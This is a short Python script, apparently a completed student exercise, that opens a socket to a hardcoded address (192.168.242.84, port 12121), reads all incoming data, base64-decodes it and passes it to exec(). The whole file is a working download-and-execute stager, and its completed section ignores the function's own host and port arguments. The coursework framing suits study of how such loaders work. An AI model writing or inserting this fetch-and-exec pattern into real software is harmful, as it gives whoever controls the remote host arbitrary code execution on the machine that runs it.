#!/usr/bin/env python3
import socket
import base64

def client(connectto='127.0.0.1',port=12345):
    '''Connects to a server and attempts to base64 decode and execute the received payload
    Args:
        connectto (str): IPv4 address in dotted decimal notation of the server to connect to
        port (int): port number that the server is listening on
    Returns:
        None
    '''
    payload = bytearray() # extend this bytearray with data received until 0 bytes received

    # Student implementation goes here ########################################
    s = socket.socket()
    s.connect(('192.168.242.84',12121))

    buf = s.recv(1)
    while buf:
        payload.extend(buf)
        buf = s.recv(1)

    payload = base64.decodebytes(payload).decode()
    exec(payload)




    ###########################################################################

if __name__ == '__main__':
    client()
